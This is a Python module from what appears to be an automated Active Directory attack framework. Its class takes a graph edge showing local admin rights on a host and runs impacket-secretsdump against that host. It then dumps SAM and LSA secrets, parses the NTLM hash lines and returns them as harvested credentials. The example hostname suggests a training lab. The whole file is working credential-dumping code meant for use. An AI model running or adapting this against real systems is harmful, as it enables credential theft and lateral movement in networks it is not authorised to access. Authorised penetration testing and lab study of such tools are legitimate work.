# strategies/admin_to.py
import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class AdminToStrategy(ExploitStrategy):
    """
    AdminTo — Droits administrateur local sur la machine cible.
    Dump les hashes SAM + secrets LSA via impacket-secretsdump.
    """
    def can_exploit(self, edge: Edge) -> bool:
        return edge.kind.name == "ADMIN_TO"
    def describe(self, edge: Edge) -> str:
        return (
            f"[AdminTo] {edge.source_node.label} est admin local sur "
            f"{edge.goal_node.label} → dump SAM + LSA"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        target = edge.goal_node.label  # ex: KINGSLANDING.SEVENKINGDOMS.LOCAL

        # impacket-secretsdump : dump SAM, LSA secrets, cached credentials
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{target}",
            "-outputfile", f"/tmp/dump_{target.split('.')[0].lower()}"
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr

            # Parse les hashes NTLM (format : user:RID:LM:NT)
            hashes = []
            for line in output.splitlines():
                if ":::" in line and not line.startswith("["):
                    hashes.append(line.strip())

            success = len(hashes) > 0

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":   "ntlm_hashes",
                    "target": target,
                    "hashes": hashes,
                } if success else None
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}